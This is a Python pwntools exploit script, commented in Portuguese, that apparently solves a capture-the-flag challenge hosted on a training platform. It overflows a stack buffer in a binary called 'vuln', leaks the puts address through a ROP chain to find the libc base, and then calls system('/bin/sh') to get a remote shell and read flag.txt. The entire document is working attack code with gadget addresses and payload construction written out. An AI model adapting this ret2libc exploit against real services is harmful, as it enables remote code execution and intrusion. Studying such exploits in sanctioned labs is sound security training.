from pwn import *

# Configuração do binário e arquitetura
context.binary = "./vuln"
context.log_level = "info"

# Arquivos locais usados para símbolos e offsets
elf = ELF("./vuln")
libc = ELF("./libc.so.6")

# Alvo remoto (troque pelo host:porta da sua instância)
HOST = "chatelaine.cylabacademy.net"
PORT = 22586

# Offset até RIP:
# buffer começa em rbp-0x80 = 128 bytes
# saved rbp = 8 bytes
# RIP = 136 bytes
offset = 136

# Endereços fixos no binário, pois PIE está desativado
main = elf.symbols["main"]
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

# Gadgets encontrados no binário
pop_rdi = 0x400913
ret = 0x40052e

def start():
    # Conecta no serviço remoto
    return remote(HOST, PORT)

p = start()

# ============================================================
# FASE 1: vazar endereço real de puts na libc
# ============================================================

payload1 = b"A" * offset

# RDI = puts@got
payload1 += p64(pop_rdi)
payload1 += p64(puts_got)

# chama puts(puts@got)
payload1 += p64(puts_plt)

# volta para main para permitir segundo payload
payload1 += p64(main)

# Aguarda banner inicial
p.recvuntil(b"sErVeR!\n")

log.info("Enviando payload 1 para vazar puts@libc")
p.sendline(payload1)

# O programa imprime nosso buffer com puts(buffer)
# Essa linha não é o leak, é o eco/saída do payload
echo_line = p.recvline()
log.info(f"Linha ecoada ignorada: {echo_line[:80]}")

# Agora vem o leak produzido por puts(puts@got)
leak_line = p.recvline().strip()
log.info(f"Leak cru: {leak_line}")

# Completa para 8 bytes e converte para inteiro little-endian
leaked_puts = u64(leak_line.ljust(8, b"\x00"))
log.success(f"puts leak = {hex(leaked_puts)}")

# Calcula base da libc remota usando offset da libc fornecida
libc.address = leaked_puts - libc.symbols["puts"]
log.success(f"libc base = {hex(libc.address)}")

# Resolve system e string /bin/sh dentro da libc
system = libc.symbols["system"]
binsh = next(libc.search(b"/bin/sh"))

log.success(f"system = {hex(system)}")
log.success(f"/bin/sh = {hex(binsh)}")

# ============================================================
# FASE 2: ret2libc para chamar system('/bin/sh')
# ============================================================

payload2 = b"A" * offset

# ret simples para alinhar a stack antes de system
payload2 += p64(ret)

# RDI = endereço de '/bin/sh'
payload2 += p64(pop_rdi)
payload2 += p64(binsh)

# chama system('/bin/sh')
payload2 += p64(system)

# Depois de voltar para main, o programa imprime o banner de novo
p.recvuntil(b"sErVeR!\n")

log.info("Enviando payload 2 para abrir shell")
p.sendline(payload2)

# Tenta capturar a flag automaticamente
p.sendline(b"cat flag.txt")

# Entrega controle interativo caso o shell esteja aberto
p.interactive()
